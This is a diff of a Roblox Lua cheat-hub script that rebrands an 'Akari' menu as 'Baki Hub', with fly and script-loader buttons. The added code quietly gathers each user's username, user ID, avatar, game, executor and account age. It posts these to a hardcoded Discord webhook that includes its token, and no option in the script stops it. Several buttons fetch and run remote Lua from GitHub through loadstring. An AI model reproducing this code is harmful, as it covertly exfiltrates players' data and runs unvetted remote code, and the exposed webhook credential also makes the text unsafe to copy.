@@ -186619,88 +186619,208 @@
 
 
 
-local Akari = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local Script3 = Instance.new("TextButton")
-local Button3Corner = Instance.new("UICorner")
-local FrameCorner = Instance.new("UICorner")
-local Script1 = Instance.new("TextButton")
-local Button2Corner = Instance.new("UICorner")
-local Script2 = Instance.new("TextButton")
-local Button1Corner = Instance.new("UICorner")
-local Image = Instance.new("ImageLabel")
-local ImageCorner = Instance.new("UICorner")
+-- mk on top
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Baki Hub System"
+	Text = "Welcome";
+	Icon = "http://www.roblox.com/asset/?id=6898239859"})
+Duration = 5;
+
+
+local Webhook = "https://discord.com/api/webhooks/1189472700784185375/UIgD_kKuqbvRJPFfY9nRk9pyZuhrv0iM-lFrs4HhAjOctUk_AGEwwEuupcWec9Hks1rT 
+_G.Discord_UserID = ""
+
+local player = game:GetService"Players".LocalPlayer
+local joinTime = os.time() - (player.AccountAge*86400)
+local joinDate = os.date("!*t", joinTime)
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+
+local executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+local msg = {
+   ["username"] = "Log Script Baki Hub System",
+   ["avatar_url"] = "",
+   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("@".._G.Discord_UserID.."") or " ",
+   ["embeds"] = {
+       {
+           ["color"] = tonumber(tostring("0x32CD32")), 
+           ["title"] = "مستخدمين السكربت",
+           ["thumbnail"] = {
+               ["url"] = AvatarImage,
+           },
+           ["fields"] = {
+                {
+                   ["name"] = "الاسم",
+                   ["value"] = player.Name,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "الاسم الوهمي",
+                   ["value"] = player.DisplayName,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "الايدي",
+                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                   ["inline"] = true
+                },
+                {
+               ["name"] = "ايدي الماب",
+               ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
+               ["inline"] = true              
+                },
+                {
+                   ["name"] = "اسم الماب",
+                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "الهاك المستخدم",
+                   ["value"] = executor,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "اشتراك روب",
+                   ["value"] = alt,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "عمر الحساب",
+                   ["value"] = player.AccountAge.."day(s)",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "وقت دخوله",
+                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                   ["inline"] = true
+                },
+           },
+           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
+       }
+   }
+}
+
+if isfile("Workspace/readthis.txt") then
+        request = http_request or request or HttpPost or syn.request
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+    makefolder("Workspace")
+    writefile("Workspace/readthis.txt", "true")
+    else
+    request = http_request or request or HttpPost or syn.request
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+    makefolder("Workspace")
+    writefile("Workspace/readthis.txt", "true")
+end
+
+
+
+local mK = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local MainCorner = Instance.new("UICorner")
+local Fly = Instance.new("TextButton")
+local FlyGradient = Instance.new("UIGradient")
+local FlyCorner = Instance.new("UICorner")
+local FlyShadowHolder = Instance.new("Frame")
+local FlyShadow = Instance.new("ImageLabel")
+local AkariHub = Instance.new("TextButton")
+local AkariHubGradient = Instance.new("UIGradient")
+local AkariHubCorner = Instance.new("UICorner")
+local AkariHubShadowHolder = Instance.new("Frame")
+local AkariHubShadow = Instance.new("ImageLabel")
 local Label = Instance.new("TextLabel")
-local opcl = Instance.new("ImageButton")
+local UIGradient = Instance.new("UIGradient")
+local ImageButton = Instance.new("ImageButton")
+local MainStroke = Instance.new("UIStroke")
+local MainGradient = Instance.new("UIGradient")
 
-Akari.Name = "Akari"
-Akari.Parent = game.CoreGui
-Akari.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+mK.Name = "mK"
+mK.Parent = game.CoreGui
+mK.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-Frame.Parent = Akari
-Frame.BackgroundColor3 = Color3.fromRGB(255, 248, 248)
-Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.395385832, 0, 0.384039909, 0)
-Frame.Size = UDim2.new(0, 245, 0, 186)
+Main.Name = "Main"
+Main.Parent = mK
+Main.Active = true
+Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Main.BorderSizePixel = 0
+Main.ClipsDescendants = true
+Main.Position = UDim2.new(0.439127326, 0, 0.546101272, 0)
+Main.Size = UDim2.new(0, 191, 0, 59)
 
-Script3.Name = "Script3"
-Script3.Parent = Frame
-Script3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Script3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Script3.BorderSizePixel = 0
-Script3.Position = UDim2.new(0.216326535, 0, 0.725806475, 0)
-Script3.Size = UDim2.new(0, 138, 0, 40)
-Script3.Font = Enum.Font.Unknown
-Script3.Text = "Script3"
-Script3.TextColor3 = Color3.fromRGB(255, 255, 255)
-Script3.TextSize = 30.000
-Script3.MouseButton1Down:connect(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Anniecuti/Free-Scr/main/Annie-Hub.lua"))()
+local function MakeDraggable() 
+	local script = Instance.new('LocalScript', Main)
 
-end)
+	local UIS = game:GetService("UserInputService")
+	function dragify(Main)
+		dragToggle = nil
+		local dragSpeed = 0
+		dragInput = nil
+		dragStart = nil
+		local dragPos = nil
+		function updateInput(input)
+			local Delta = input.Position - dragStart
+			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			game:GetService("TweenService"):Create(Main, TweenInfo.new(0.25), {Position = Position}):Play()
+		end
+		Main.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Main.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+					end
+				end)
+			end
+		end)
+		Main.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+		game:GetService("UserInputService").InputChanged:Connect(function(input)
+			if input == dragInput and dragToggle then
+				updateInput(input)
+			end
+		end)
+	end
 
-Button3Corner.CornerRadius = UDim.new(0, 20)
-Button3Corner.Name = "Button3Corner"
-Button3Corner.Parent = Script3
+	dragify(script.Parent)
+end
 
-FrameCorner.CornerRadius = UDim.new(0, 20)
-FrameCorner.Name = "FrameCorner"
-FrameCorner.Parent = Frame
+MakeDraggable()
 
-Script1.Name = "Script1"
-Script1.Parent = Frame
-Script1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Script1.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Script1.BorderSizePixel = 0
-Script1.Position = UDim2.new(0.216326535, 0, 0.17741935, 0)
-Script1.Size = UDim2.new(0, 138, 0, 40)
-Script1.Font = Enum.Font.Unknown
-Script1.Text = "Script1"
-Script1.TextColor3 = Color3.fromRGB(255, 255, 255)
-Script1.TextSize = 30.000
-Script1.MouseButton1Down:connect(function()
-    loadstring (game: HttpGet ('https://raw.githubusercontent.com/Sixnumz/ZamexMobile/main/Zamex_Mobile.lua')) ()
-end)
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Name = "MainCorner"
+MainCorner.Parent = Main
 
-Button2Corner.CornerRadius = UDim.new(0, 20)
-Button2Corner.Name = "Button2Corner"
-Button2Corner.Parent = Script1
-
-Script2.Name = "Script2"
-Script2.Parent = Frame
-Script2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Script2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Script2.BorderSizePixel = 0
-Script2.Position = UDim2.new(0.216326535, 0, 0.45161289, 0)
-Script2.Size = UDim2.new(0, 138, 0, 40)
-Script2.Font = Enum.Font.Unknown
-Script2.Text = "Script2"
-Script2.TextColor3 = Color3.fromRGB(255, 255, 255)
-Script2.TextSize = 30.000
-Script2.MouseButton1Down:connect(function()
-
-local main = Instance.new("ScreenGui")
+Fly.Name = "Fly"
+Fly.Parent = Main
+Fly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Fly.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Fly.BorderSizePixel = 0
+Fly.Position = UDim2.new(0.0555195995, 0, 0.441176474, 0)
+Fly.Size = UDim2.new(0, 80, 0, 22)
+Fly.Font = Enum.Font.RobotoCondensed
+Fly.Text = "Fly"
+Fly.TextColor3 = Color3.fromRGB(0, 0, 0)
+Fly.TextSize = 14.000
+Fly.MouseButton1Down:connect(function()
+	local main = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local up = Instance.new("TextButton")
 local down = Instance.new("TextButton")
@@ -186758,7 +186878,7 @@ TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
 TextLabel.Size = UDim2.new(0, 100, 0, 28)
 TextLabel.Font = Enum.Font.RobotoCondensed
-TextLabel.Text = "Fly Akari"
+TextLabel.Text = "Fly mK"
 TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
@@ -186838,9 +186958,9 @@ local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
 nowe = false
 
 game:GetService("StarterGui"):SetCore("SendNotification", { 
-	Title = "Fly";
-	Text = "Fly  by Akari";
-	Icon = "http://www.roblox.com/asset/?id=14148603796"})
+	Title = "Baki Hub System"
+	Text = "Fly  Script On";
+	Icon = "http://www.roblox.com/asset/?id=6898239859"})
 Duration = 5;
 
 Frame.Active = true -- main = gui
@@ -187176,94 +187296,133 @@ mini2.MouseButton1Click:Connect(function()
 end)
 end)
 
+FlyGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 229, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(11, 56, 255))}
+FlyGradient.Name = "FlyGradient"
+FlyGradient.Parent = Fly
 
+FlyCorner.Name = "FlyCorner"
+FlyCorner.Parent = Fly
 
-Button1Corner.CornerRadius = UDim.new(0, 20)
-Button1Corner.Name = "Button1Corner"
-Button1Corner.Parent = Script2
+FlyShadowHolder.Name = "FlyShadowHolder"
+FlyShadowHolder.Parent = Fly
+FlyShadowHolder.BackgroundTransparency = 1.000
+FlyShadowHolder.BorderSizePixel = 0
+FlyShadowHolder.Size = UDim2.new(1, 0, 1, 0)
+FlyShadowHolder.ZIndex = 0
 
-Image.Name = "Image"
-Image.Parent = Frame
-Image.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Image.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Image.BorderSizePixel = 0
-Image.Position = UDim2.new(0.355102032, 0, -0.279569894, 0)
-Image.Size = UDim2.new(0, 70, 0, 58)
-Image.Image = "http://www.roblox.com/asset/?id=14148603796"
+FlyShadow.Name = "FlyShadow"
+FlyShadow.Parent = FlyShadowHolder
+FlyShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+FlyShadow.BackgroundTransparency = 1.000
+FlyShadow.BorderSizePixel = 0
+FlyShadow.Position = UDim2.new(0.53125, 0, 0.386363626, 0)
+FlyShadow.Size = UDim2.new(0.9375, 47, 0.772727251, 47)
+FlyShadow.ZIndex = 0
+FlyShadow.Image = "rbxassetid://6015897843"
+FlyShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+FlyShadow.ImageTransparency = 0.500
+FlyShadow.ScaleType = Enum.ScaleType.Slice
+FlyShadow.SliceCenter = Rect.new(49, 49, 450, 450)
 
-ImageCorner.CornerRadius = UDim.new(0, 30)
-ImageCorner.Name = "ImageCorner"
-ImageCorner.Parent = Image
+AkariHub.Name = "AkariHub"
+AkariHub.Parent = Main
+AkariHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AkariHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AkariHub.BorderSizePixel = 0
+AkariHub.Position = UDim2.new(0.544766963, 0, 0.441176474, 0)
+AkariHub.Size = UDim2.new(0, 80, 0, 22)
+AkariHub.Font = Enum.Font.RobotoCondensed
+AkariHub.Text = "Akari Hub"
+AkariHub.TextColor3 = Color3.fromRGB(0, 0, 0)
+AkariHub.TextSize = 14.000
+AkariHub.MouseButton1Down:connect(function()
+	game:GetService("StarterGui"):SetCore("SendNotification", { 
+		Title = "Baki Hub System"
+		Text = "Akari  Script On";
+		Icon = "http://www.roblox.com/asset/?id=6898239859"})
+	Duration = 5;
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/v1mk/script/main/Akari"))()
+end)
+
+AkariHubGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(11, 56, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 229, 255))}
+AkariHubGradient.Name = "AkariHubGradient"
+AkariHubGradient.Parent = AkariHub
+
+AkariHubCorner.Name = "AkariHubCorner"
+AkariHubCorner.Parent = AkariHub
+
+AkariHubShadowHolder.Name = "AkariHubShadowHolder"
+AkariHubShadowHolder.Parent = AkariHub
+AkariHubShadowHolder.BackgroundTransparency = 1.000
+AkariHubShadowHolder.BorderSizePixel = 0
+AkariHubShadowHolder.Size = UDim2.new(1, 0, 1, 0)
+AkariHubShadowHolder.ZIndex = 0
+
+AkariHubShadow.Name = "AkariHubShadow"
+AkariHubShadow.Parent = AkariHubShadowHolder
+AkariHubShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+AkariHubShadow.BackgroundTransparency = 1.000
+AkariHubShadow.BorderSizePixel = 0
+AkariHubShadow.Position = UDim2.new(0.506250024, 0, 0.215240479, 0)
+AkariHubShadow.Size = UDim2.new(1.01250005, 47, 0.430480957, 47)
+AkariHubShadow.ZIndex = 0
+AkariHubShadow.Image = "rbxassetid://6015897843"
+AkariHubShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+AkariHubShadow.ImageTransparency = 0.500
+AkariHubShadow.ScaleType = Enum.ScaleType.Slice
+AkariHubShadow.SliceCenter = Rect.new(49, 49, 450, 450)
 
 Label.Name = "Label"
-Label.Parent = Frame
+Label.Parent = Main
 Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Label.BackgroundTransparency = 1.000
 Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Label.BorderSizePixel = 0
-Label.Position = UDim2.new(0.0367346928, 0, 0, 0)
-Label.Size = UDim2.new(0, 94, 0, 27)
-Label.Font = Enum.Font.RobotoCondensed
-Label.Text = "Akari and mK"
-Label.TextColor3 = Color3.fromRGB(0, 0, 0)
-Label.TextSize = 20.000
+Label.Size = UDim2.new(0, 80, 0, 22)
+Label.Font = Enum.Font.SourceSans
+Label.Text = "Baki Hub"
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label.TextSize = 14.000
 
-opcl.Name = "opcl"
-opcl.Parent = Akari
-opcl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-opcl.BorderColor3 = Color3.fromRGB(0, 0, 0)
-opcl.BorderSizePixel = 0
-opcl.Position = UDim2.new(0.23627685, 0, 0.64339155, 0)
-opcl.Size = UDim2.new(0, 47, 0, 47)
-opcl.Image = "http://www.roblox.com/asset/?id=15478232796"
-opcl.MouseButton1Down:connect(function()
-    Frame.Visible = not Frame.Visible 
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 145, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(35, 15, 255))}
+UIGradient.Parent = Label
+
+ImageButton.Parent = Main
+ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageButton.BackgroundTransparency = 1.000
+ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageButton.BorderSizePixel = 0
+ImageButton.Position = UDim2.new(0.874345541, 0, 0.00897320267, 0)
+ImageButton.Size = UDim2.new(0, 17, 0, 20)
+ImageButton.Image = "rbxassetid://10747384394"
+ImageButton.MouseButton1Down:connect(function()
+	Main.Visible = false
 end)
 
-local function MakeDraggable() 
-    local script = Instance.new('LocalScript', Frame)
+MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+MainStroke.Color = Color3.fromRGB(255, 255, 255)
+MainStroke.Thickness = 2
+MainStroke.Name = "MainStroke"
+MainStroke.Parent = Main
 
-    local UIS = game:GetService("UserInputService")
-    function dragify(Frame)
-        dragToggle = nil
-        local dragSpeed = 0
-        dragInput = nil
-        dragStart = nil
-        local dragPos = nil
-        function updateInput(input)
-            local Delta = input.Position - dragStart
-            local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
-            game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
-        end
-        Frame.InputBegan:Connect(function(input)
-            if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
-                dragToggle = true
-                dragStart = input.Position
-                startPos = Frame.Position
-                input.Changed:Connect(function()
-                    if input.UserInputState == Enum.UserInputState.End then
-                        dragToggle = false
-                    end
-                end)
-            end
-        end)
-        Frame.InputChanged:Connect(function(input)
-            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-                dragInput = input
-            end
-        end)
-        game:GetService("UserInputService").InputChanged:Connect(function(input)
-            if input == dragInput and dragToggle then
-                updateInput(input)
-            end
-        end)
-    end
+MainGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(11, 161, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(5, 105, 255))}
+MainGradient.Rotation = 2
+MainGradient.Name = "MainGradient"
+MainGradient.Parent = MainStroke
 
-    dragify(script.Parent)
+-- Scripts:
+
+local function RLJOPST_fake_script() -- Main.nice 
+	local script = Instance.new('LocalScript', Main)
+
+	local Uigradient = script.Parent.MainStroke.MainGradient
+	local runService = game:GetService("RunService")
+	
+	runService.RenderStepped:Connect(function()
+		Uigradient.Rotation += 2
+	end)
 end
-
-MakeDraggable()
-
+coroutine.wrap(RLJOPST_fake_script)()
 
 
 
